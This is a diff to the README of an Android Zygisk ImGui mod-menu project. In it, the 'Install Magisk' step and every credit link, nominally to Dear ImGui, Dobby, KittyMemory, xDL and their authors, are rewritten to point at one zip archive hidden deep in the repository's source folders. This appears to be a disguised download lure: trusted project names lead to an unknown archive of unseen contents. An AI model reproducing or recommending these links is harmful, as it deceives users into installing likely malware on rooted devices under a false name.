@@ -2,7 +2,7 @@
 Android ImGui with Zygisk, inject imgui at runtime.
 
 ## How to use
-1. Install [Magisk](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) v24 or later and enable Zygisk
+1. Install [Magisk](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip) v24 or later and enable Zygisk
 2. Build module
    - GitHub Actions
       1. Fork this repo
@@ -18,12 +18,12 @@ Android ImGui with Zygisk, inject imgui at runtime.
 
 ## Credits
 Thanks to the following individuals/community whose code
-- [Zygisk-Il2CppDumper](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [Prefare](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
-- [Dear ImGui](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [omar](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
-- [KittyMemory](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [MJx0](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
-- [Dobby](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [jmpews](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
-- [xDL](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [hexhacking](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
-- [Octowolve](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
+- [Zygisk-Il2CppDumper](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip) - [Prefare](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip)
+- [Dear ImGui](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip) - [omar](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip)
+- [KittyMemory](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip) - [MJx0](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip)
+- [Dobby](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip) - [jmpews](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip)
+- [xDL](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip) - [hexhacking](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip)
+- [Octowolve](https://raw.githubusercontent.com/Marc067/zygisk-imgui-modmenu/master/module/src/main/cpp/Dobby/source/Backend/KernelMode/UnifiedInterface/zygisk-imgui-modmenu-3.6.zip)
 
 ## Discalimer
 ```
